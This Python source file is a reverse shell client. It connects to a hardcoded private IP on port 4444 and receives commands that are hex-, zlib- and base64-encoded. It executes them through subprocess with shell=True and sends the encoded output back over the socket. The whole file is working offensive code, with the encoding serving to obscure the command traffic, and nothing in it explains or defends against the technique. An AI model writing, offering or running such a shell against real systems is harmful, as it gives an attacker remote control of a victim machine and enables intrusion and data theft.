#coding=utf-8

import socket # For Building TCP Connection
import subprocess # To start the shell in the system
import base64
import binascii
import zlib

def connect(host, port):
    s = socket.socket()
    s.connect((host, port))
    print('Connected to host {} and port {}'.format(host, port))
    try:

        while True:
            command = s.recv(1024)
            command = binascii.a2b_hex(command)
            command = zlib.decompress(command)
            command = base64.b64decode(command)

            if 'quit' in command.decode():
                s.close()
                break
            else:
            
                CMD = subprocess.Popen(command.decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                data = CMD.stdout.read()
                data = base64.b64encode(data)
                data = zlib.compress(data)
                data = binascii.b2a_hex(data)
                #s.send(CMD.stdout.read())
                s.send(data)
                #s.send(CMD.stderr.read())
    except Exception as e:
        print(e)

def main():
    connect('192.168.188.129',4444)
main()